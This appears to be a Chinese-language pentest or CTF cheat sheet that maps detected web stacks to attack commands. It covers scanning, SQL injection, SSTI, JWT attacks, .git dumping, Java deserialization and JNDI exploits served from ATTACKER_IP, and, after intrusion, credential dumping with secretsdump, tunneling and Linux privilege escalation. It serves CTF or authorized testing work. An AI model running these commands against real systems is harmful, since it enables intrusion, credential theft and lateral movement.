## 工具使用决策树（根据识别到的技术栈选择工具）

```
┌─ 拿到URL → nuclei全面扫描 + httpx技术栈识别
├─ SpringBoot → python3 ~/tools/recon/SBSCAN/sbscan.py -u URL
├─ Shiro(rememberMe) → java -jar ~/tools/java_exploit/shiro_tool.jar
├─ Fastjson/Log4j/JNDI → java -jar ~/tools/java_exploit/JNDIExploit.jar -i ATK_IP -p 8888
├─ ThinkPHP → java -jar ~/tools/java_exploit/ThinkPHP.jar
├─ 通达OA → java -jar ~/tools/java_exploit/TongdaTools.jar
├─ Flask SSTI → fenjing crack --url URL --method GET --inputs name
├─ Flask Session → flask-unsign --decode --cookie COOKIE
├─ JWT → python3 ~/tools/jwt_tool/jwt_tool.py TOKEN -M at
├─ SQL注入 → sqlmap -u URL --batch --dbs
├─ .git泄露 → git-dumper URL/.git/ /tmp/git-output
├─ SSRF+Redis → python2 ~/tools/Gopherus/gopherus.py --exploit redis
├─ 目录扫描 → ffuf -u URL/FUZZ -w ~/tools/SecLists/Discovery/Web-Content/common.txt -mc 200,301,302,403 -t 50 -s
└─ 进入内网后:
   ├─ 内网扫描 → ~/tools/recon/fscan -h CIDR/24
   ├─ 域渗透 → impacket-psexec / impacket-secretsdump
   ├─ 隧道代理 → chisel / stowaway / Neo-reGeorg
   └─ Linux提权 → bash ~/tools/privesc/linpeas_small.sh
```

## 外部专业工具快速命令

| 场景 | 命令 |
|------|------|
| 漏洞扫描 | `nuclei -u http://TARGET -severity critical,high -silent -nc` |
| 标签扫描 | `nuclei -u http://TARGET -tags shiro,nacos,spring,struts,thinkphp -silent -nc` |
| HTTP探测 | `echo 'http://TARGET' \| httpx -title -status-code -tech-detect -silent` |
| SQL注入 | `sqlmap -u 'http://TARGET/page?id=1' --batch --dbs --random-agent` |
| SSTI | `fenjing crack --url 'http://TARGET' --method GET --inputs name` |
| JWT | `python3 ~/tools/jwt_tool/jwt_tool.py TOKEN -M at` |
| .git泄露 | `git-dumper http://TARGET/.git/ /tmp/git-output` |
| 目录Fuzz | `ffuf -u http://TARGET/FUZZ -w ~/tools/SecLists/Discovery/Web-Content/common.txt -mc 200,301,302,403 -t 50 -s` |

## Java漏洞利用工具(~/tools/java_exploit/)

| 工具 | 命令 |
|------|------|
| ysoserial | `java -jar ~/tools/ysoserial-all.jar CommonsCollections6 'cat /flag' \| base64 -w0` |
| JNDIExploit | `java -jar ~/tools/java_exploit/JNDIExploit.jar -i ATTACKER_IP -p 8888` |
| java-chains | `java -jar ~/tools/java_exploit/java-chains-1.4.0.jar` |
| Shiro利用 | `java -jar ~/tools/java_exploit/shiro_tool.jar` |
| SpringBootExploit | `java -jar ~/tools/java_exploit/SpringBootExploit-1.3-SNAPSHOT-all.jar` |
| ThinkPHP利用 | `java -jar ~/tools/java_exploit/ThinkPHP.jar` |
| 通达OA利用 | `java -jar ~/tools/java_exploit/TongdaTools.jar` |
